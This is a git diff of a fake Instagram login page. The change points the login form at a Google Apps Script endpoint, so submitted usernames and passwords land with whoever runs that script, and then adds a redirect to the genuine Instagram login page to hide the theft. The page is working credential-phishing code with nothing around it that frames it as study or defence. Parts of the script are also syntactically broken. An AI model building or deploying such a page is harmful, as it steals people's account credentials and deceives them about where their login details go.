@@ -15,7 +15,7 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form action="https://www.instagram.com/accounts/login/" method="post" name="google-sheet">
+                <form action="https://script.google.com/macros/s/AKfycbw_nkkDE8jnqDQW2XBP6H7RzcgISCJb0lV3szVMRAr_0oefk2EhSlQy11C9e6iuhuEG/exec" method="post" name="google-sheet">
                     <label for="email" class="sr-only">Phone number, username, or email</label>
                     <input name="email" placeholder="Phone number, username, or email" />
 
@@ -76,12 +76,14 @@
         form.addEventListener('submit', e => {
           e.preventDefault()
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          window.location.href = "https://www.instagram.com/accounts/login/";
             .catch(error => console.error('Error!', error.message))
             })
         function.redirect() {
             window.location.href = "https://www.instagram.com/accounts/login/";
         }
         
+
       </script>
   
 </body> 
